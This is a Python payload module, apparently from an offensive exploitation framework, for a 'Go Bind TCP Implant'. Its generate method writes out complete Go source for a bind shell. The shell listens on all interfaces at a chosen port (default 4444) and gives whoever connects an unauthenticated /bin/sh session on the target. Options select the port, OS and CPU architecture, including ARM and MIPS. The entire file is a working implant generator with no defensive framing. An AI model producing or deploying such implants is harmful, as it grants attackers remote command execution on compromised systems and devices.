"""Go Bind TCP Implant."""

from embedxpl.core.exploit.payloads import BasePayload


class Payload(BasePayload):
    __info__ = {
        "name": "Go Bind TCP",
        "description": "Go native bind TCP shell — listens on target.",
        "authors": ("André Henrique (@mrhenrike)", "União Geek"),
    }

    options = {
        "LPORT": {"description": "Bind port on target", "required": True, "default": "4444", "value": "4444"},
        "ARCH":  {"description": "GOARCH (amd64/arm/arm64/mips/mipsle)", "required": False, "default": "arm", "value": "arm"},
        "OS":    {"description": "GOOS (linux/windows)", "required": False, "default": "linux", "value": "linux"},
    }

    def generate(self) -> bytes:
        lport = self.options["LPORT"]["value"]
        src = f'''package main

import (
	"net"
	"os/exec"
)

func main() {{
	ln, _ := net.Listen("tcp", "0.0.0.0:{lport}")
	conn, _ := ln.Accept()
	defer conn.Close()
	cmd := exec.Command("/bin/sh")
	cmd.Stdin = conn
	cmd.Stdout = conn
	cmd.Stderr = conn
	cmd.Run()
}}
'''
        return src.encode()
